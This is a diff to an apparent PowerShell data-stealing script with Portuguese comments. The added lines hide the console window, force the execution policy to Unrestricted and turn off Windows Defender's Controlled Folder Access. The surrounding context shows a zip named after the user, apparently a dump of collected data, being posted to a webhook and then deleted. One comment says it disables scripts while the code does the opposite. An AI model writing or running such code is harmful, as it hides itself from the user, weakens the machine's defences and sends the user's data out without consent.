@@ -1,3 +1,20 @@
+# Esconder o PowerShell
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = Oculto, 5 = Visível
+
+# Desabilitar a execução de scripts (para todos os usuários)
+Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Unrestricted -Force
+
+# Desabilitar a Proteção de Execução do Windows Defender
+Set-MpPreference -EnableControlledFolderAccess Disabled
+
 # Caminho do arquivo a ser removido, usando variáveis de ambiente para torná-lo mais genérico
 $zipPath = Join-Path -Path $env:APPDATA -ChildPath "dump+${env:USERNAME}.zip"
 
@@ -77,3 +94,6 @@ Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyCon
 
 # Tentando remover o arquivo ZIP
 Remove-File -filePath $zipPath
+
+# Saindo do Powershell
+exit
